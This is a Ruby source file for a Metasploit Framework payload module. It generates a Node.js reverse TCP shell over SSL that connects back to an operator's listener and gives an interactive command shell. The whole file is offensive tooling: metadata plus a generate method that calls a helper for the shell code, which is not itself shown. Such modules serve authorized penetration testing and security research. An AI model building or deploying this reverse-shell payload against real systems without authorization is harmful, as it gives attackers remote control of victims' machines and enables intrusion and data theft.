##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 831

  include Msf::Payload::Single
  include Msf::Payload::NodeJS
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Command Shell, Reverse TCP SSL (via nodejs)',
        'Description' => 'Creates an interactive shell via nodejs, uses SSL',
        'Author' => ['RageLtMan', 'joev'],
        'License' => BSD_LICENSE,
        'Platform' => 'nodejs',
        'Arch' => ARCH_NODEJS,
        'Handler' => Msf::Handler::ReverseTcpSsl,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'nodejs',
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    super + command_string
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    nodejs_reverse_tcp(use_ssl: true)
  end
end
